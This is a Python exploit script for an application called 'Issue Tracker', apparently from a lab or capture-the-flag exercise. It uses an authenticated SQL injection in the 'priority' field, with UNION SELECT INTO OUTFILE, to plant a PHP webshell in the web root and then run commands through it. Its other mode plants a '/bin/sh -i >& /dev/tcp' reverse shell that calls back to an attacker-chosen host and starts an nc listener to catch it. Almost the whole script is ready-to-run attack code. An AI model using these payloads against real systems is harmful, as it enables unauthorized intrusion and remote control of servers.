#!/usr/bin/env python3
# Title: "Issue Tracker" Authenticated Remote Code Execution Via SQL Injection
# Authors: Jessi and Rin
# Abuses an oversight in "Issue Tracker" to exploit a SQLi vuln and write a PHP backdoor
# Usage: python3 issueRCE.py -t <target_ip> -c <jsessionid> (or for rev, add -l and -p)

import requests
import os
import time
import sys
import argparse
import colorama
import threading
from colorama import Fore, Style
from multiprocessing.dummy import Pool


# Colors
GREEN = Fore.GREEN
RED = Fore.RED
WHITE = Fore.WHITE
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
PINK = Fore.MAGENTA
BRIGHT = Style.BRIGHT
DIM = Style.DIM
NORM = Style.NORMAL
RST = Style.RESET_ALL


# Warn if no arguments
if len(sys.argv) <= 1:
    print(f'{RED}{BRIGHT}[X] {NORM}{WHITE}No arguments supplied.{RST}')
    print(f'{DIM} -h (--help) for full usage.{RST}')
    exit(1)


# Define parser and arguments
parser = argparse.ArgumentParser(description=f'{PINK}{BRIGHT} Issue Tracker{DIM} Authenticated Remote Code Execution {BRIGHT}Exploit{RST}')

parser.add_argument('-t', '--target', help=f'Target ip{RED}{BRIGHT} REQUIRED{RST}', default=None, required=True)
parser.add_argument('-c', '--cookie', help=f'{CYAN}{BRIGHT}JSESSIONID{RST} cookie{RED}{BRIGHT} REQUIURED{RST}', default=None, required=True)
parser.add_argument('-l', '--lhost', help=f'LHOST {DIM}OPTIONAL (Required if you want a reverse shell, along with -p (--port)){RST}', default=None, required=False)
parser.add_argument('-p', '--port', help=f'LPORT {DIM}OPTIONAL (Required if you want a reverse shell){RST}', default=None, required=False)

args = parser.parse_args()


# Set args to vars
target = args.target
cookie = args.cookie
lhost = args.lhost
lport = args.port


# Define functions
def webshell(url,cookies):
    print(f'{CYAN}{BRIGHT}[!] {NORM}{WHITE}Webshell payload configured{RST}')
    payload = '''High' UNION SELECT "<?php echo exec($_GET['cmd']); ?>" INTO OUTFILE "/srv/http/jes.php"; --  '''
    data = {'priority':payload}
    requests.post(url,cookies=cookies,data=data)
    time.sleep(2)
    print(f'{GREEN}{BRIGHT}[+] {NORM}{WHITE}Payload sent{RST}')


def rev_shell_stager(url,cookies,lhost,lport):
    print(f'{CYAN}{BRIGHT}[!] {NORM}{WHITE}Reverse shell payload configured{RST}')
    print(f'{PINK}{BRIGHT}[*] {NORM}{WHITE}LHOST: {BRIGHT}{lhost}{RST}')
    print(f'{PINK}{BRIGHT}[*] {NORM}{WHITE}LPORT: {BRIGHT}{lport}{RST}')
    payload = f'''High' UNION SELECT "<?php exec('/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'); ?>" INTO OUTFILE "/srv/http/s.php"; --  '''
    data = {'priority':payload}
    requests.post(url,cookies=cookies,data=data)
    print(f'{GREEN}{BRIGHT}[+] {NORM}{WHITE}Payload sent{RST}')



# Dictionary for exits
exitDict = ['exit','clear']


# Define url and cookies
url = f'http://{target}:17445/issue/checkByPriority'
cookies = {'JSESSIONID':cookie}


# Webshell RCE
if not lhost:
    webshell(url,cookies)
    shell = f'http://{target}:30455/jes.php'
    check = requests.get(shell)
    if not check.status_code == 200:
        print(f'{RED}{BRIGHT}[x] {NORM}{WHITE}Exploit failed')
        exit(1)
    else:
        print(f'{GREEN}{BRIGHT}[+] {NORM}{WHITE}Exploit success{RST}')
        print(f'{GREEN}{BRIGHT}[+] {NORM}{WHITE}Spawning shell...{RST}')
        time.sleep(2)
        while True:
            cmd = input(f'{PINK}issue{RST} {RED}$>{RST} ')
            if cmd not in exitDict:
                r = requests.get(f'{shell}?cmd={cmd}')
                rtext = r.text
                print(f'{BRIGHT}{rtext}{RST}')
            elif cmd in exitDict:
                if cmd == 'exit':
                    print(f'{RED}{BRIGHT}[!]{RST} {DIM}Exiting shell...{RST}')
                    time.sleep(1)
                    exit(0)
                if cmd == 'clear':
                    os.system('clear')


# Reverse shell
rev_shell_stager(url,cookies,lhost,lport)
shell = f'http://{target}:30455/s.php'
print(f'{PINK}{BRIGHT}[*] Executing payload...{RST}')
time.sleep(2)
pool = Pool(1) # Creates a pool with one thread; more threads = more concurrency.

if __name__ == '__main__':
    pool.apply_async(requests.get, [f'{shell}'])
    print(f'{GREEN}{BRIGHT}[+] {NORM}{WHITE}Starting listener{RST}')
    os.system(f'nc -lvnp {lport}')
    print(f'{RED}{BRIGHT}[!]{RST} {DIM}Exiting shell...{RST}')
    time.sleep(1)
